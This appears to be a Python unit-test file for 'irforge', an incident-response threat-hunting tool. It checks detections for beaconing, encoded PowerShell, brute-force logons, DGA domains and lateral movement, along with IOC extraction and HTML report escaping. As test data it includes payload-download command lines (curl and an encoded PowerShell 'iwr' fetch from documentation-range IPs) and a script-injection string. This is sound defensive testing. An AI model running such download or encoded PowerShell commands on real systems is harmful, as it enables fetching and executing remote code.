import os
import tempfile
import unittest
from datetime import datetime, timedelta

from irforge import case, hunts, iocs, report, scoring, simulate, timeline, tree
from irforge.models import Event, load_events

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def ev(sec, eid, **kw):
    kw.setdefault("host", "H1")
    kw.setdefault("user", "u")
    return Event(time=datetime(2026, 3, 1, 10, 0, 0) + timedelta(seconds=sec), event_id=eid, **kw)


class SimulationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        rows = simulate.generate(11, 120)
        path = os.path.join(tempfile.mkdtemp(), "e.csv")
        simulate.write_csv(path, rows)
        cls.events = load_events(path)
        cls.findings = hunts.run_all(cls.events)

    def test_every_expected_hunt_fires(self):
        fired = {f.hunt for f in self.findings}
        self.assertEqual(simulate.EXPECTED_HUNTS - fired, set())

    def test_no_findings_on_benign_noise(self):
        benign = [e for e in self.events if e.host == "SRV01" and e.user == "svc_mon"]
        self.assertEqual([f for f in hunts.run_all(benign) if f.hunt == "beaconing"], [])

    def test_av_lsass_access_not_flagged(self):
        self.assertFalse([f for f in self.findings if f.hunt == "lsass-access" and "msmpeng" in f.message.lower()])

    def test_beacon_interval_estimated(self):
        b = [f for f in self.findings if f.hunt == "beaconing"][0]
        self.assertAlmostEqual(b.evidence["interval"], 60, delta=3)

    def test_other_seeds(self):
        for seed in (1, 2, 3):
            fs = hunts.run_all(self._events(seed))
            self.assertEqual(simulate.EXPECTED_HUNTS - {f.hunt for f in fs}, set(), seed)

    def _events(self, seed):
        path = os.path.join(tempfile.mkdtemp(), "e.csv")
        simulate.write_csv(path, simulate.generate(seed, 100))
        return load_events(path)

    def test_legacy_csv_still_works(self):
        events = load_events(os.path.join(ROOT, "sample_data", "events.csv"))
        names = {f.hunt for f in hunts.run_all(events)}
        self.assertIn("run-key-persistence", names)


class HuntUnitTests(unittest.TestCase):
    def test_beacon_needs_regularity(self):
        regular = [ev(i * 30, 3, image="C:\\a.exe", target="1.2.3.4:443") for i in range(10)]
        irregular = [ev(t, 3, image="C:\\a.exe", target="1.2.3.4:443") for t in (0, 5, 80, 100, 400, 410, 900, 1500, 1520, 3000)]
        self.assertTrue(list(hunts.beaconing(regular)))
        self.assertFalse(list(hunts.beaconing(irregular)))

    def test_too_few_connections_not_beacon(self):
        few = [ev(i * 30, 3, image="C:\\a.exe", target="1.2.3.4:443") for i in range(4)]
        self.assertFalse(list(hunts.beaconing(few)))

    def test_encoded_powershell_variants(self):
        for flag in ("-enc", "-EncodedCommand", "-ec"):
            e = ev(0, 1, image="C:\\powershell.exe", command_line="powershell.exe -nop %s SQBFAFgA" % flag)
            self.assertTrue(list(hunts.encoded_powershell([e])), flag)
        e = ev(0, 1, image="C:\\powershell.exe", command_line="powershell.exe -File a.ps1")
        self.assertFalse(list(hunts.encoded_powershell([e])))

    def test_brute_force_then_success_is_high(self):
        evs = [ev(i * 5, 4625, source_ip="9.9.9.9", user="bob") for i in range(6)] + [ev(40, 4624, source_ip="9.9.9.9", user="bob")]
        f = list(hunts.brute_force(evs))[0]
        self.assertEqual(f.severity, "high")

    def test_dga_ignores_normal_domains(self):
        evs = [ev(i, 22, target=d) for i, d in enumerate(["www.example.com", "mail.google.com", "login.microsoftonline.com"])]
        self.assertFalse(list(hunts.dga_dns(evs)))

    def test_lateral_needs_distinct_hosts(self):
        evs = [ev(i, 4624, host="H1", user="a", source_ip="10.0.0.5", target="3") for i in range(6)]
        self.assertFalse(list(hunts.lateral_logons(evs)))


class IocTests(unittest.TestCase):
    def test_decode_powershell(self):
        import base64
        b64 = base64.b64encode("Write-Host hi".encode("utf-16-le")).decode()
        self.assertEqual(iocs.decode_powershell(b64), "Write-Host hi")

    def test_private_ips_excluded_and_urls_found(self):
        e = ev(0, 1, command_line="curl http://203.0.113.9/x.exe 10.0.0.5 8.8.8.8 d41d8cd98f00b204e9800998ecf8427e")
        res = iocs.extract([e])
        self.assertIn("203.0.113.9", res["ips"])
        self.assertIn("8.8.8.8", res["ips"])
        self.assertNotIn("10.0.0.5", res["ips"])
        self.assertIn("http://203.0.113.9/x.exe", res["urls"])
        self.assertEqual(res["hashes"], ["d41d8cd98f00b204e9800998ecf8427e"])

    def test_nested_ioc_in_encoded_payload(self):
        import base64
        b64 = base64.b64encode("iwr http://198.51.100.7/a".encode("utf-16-le")).decode()
        e = ev(0, 1, command_line="powershell -enc " + b64)
        self.assertIn("198.51.100.7", iocs.extract([e])["ips"])


class TreeTests(unittest.TestCase):
    def test_pid_tree(self):
        a = ev(0, 1, image="C:\\a.exe", pid=1, ppid=0)
        b = ev(1, 1, image="C:\\b.exe", pid=2, ppid=1, parent_image="C:\\a.exe")
        c = ev(2, 1, image="C:\\c.exe", pid=3, ppid=2, parent_image="C:\\b.exe")
        t = tree.build([a, b, c])
        self.assertEqual(t["mode"], "pid")
        text = tree.render(t, {id(c)}, only_flagged=True)
        self.assertEqual(len(text.splitlines()), 3)
        self.assertIn("[!]", text)

    def test_unflagged_branch_pruned(self):
        a = ev(0, 1, image="C:\\a.exe", pid=1, ppid=0)
        b = ev(1, 1, image="C:\\b.exe", pid=2, ppid=1)
        d = ev(2, 1, image="C:\\d.exe", pid=4, ppid=1)
        text = tree.render(tree.build([a, b, d]), {id(b)}, only_flagged=True)
        self.assertNotIn("d.exe", text)

    def test_approx_mode_warns(self):
        a = ev(0, 1, image="C:\\a.exe", parent_image="C:\\x.exe")
        self.assertIn("approximate", tree.render(tree.build([a])))


class ScoringReportCaseTests(unittest.TestCase):
    def test_scores_and_timeline(self):
        events = [ev(0, 1, image="C:\\powershell.exe", parent_image="C:\\WINWORD.EXE", command_line="powershell -enc AAAA BBBB")]
        fs = hunts.run_all(events)
        self.assertTrue(fs)
        self.assertEqual(scoring.host_scores(fs)[0]["host"], "H1")
        self.assertIn("Initial Access", timeline.phases(fs))

    def test_html_report_escapes(self):
        events = [ev(0, 1, host="<script>x</script>", image="C:\\powershell.exe", parent_image="C:\\WINWORD.EXE", command_line="powershell")]
        out = report.html_report(events, hunts.run_all(events))
        self.assertNotIn("<script>x</script>", out)
        self.assertIn("&lt;script&gt;", out)

    def test_case_store(self):
        store = case.CaseStore()
        events = [ev(0, 1, image="C:\\powershell.exe", parent_image="C:\\WINWORD.EXE", command_line="powershell")]
        cid = store.new_case("test", "high")
        store.attach(cid, hunts.run_all(events))
        store.note(cid, "looked at it")
        store.set_status(cid, "closed")
        data = store.show(cid)
        self.assertEqual(data["case"]["status"], "closed")
        self.assertIsNotNone(data["case"]["closed"])
        self.assertEqual(len(data["notes"]), 1)
        self.assertGreaterEqual(len(data["findings"]), 1)
        with self.assertRaises(ValueError):
            store.set_status(cid, "weird")


if __name__ == "__main__":
    unittest.main()
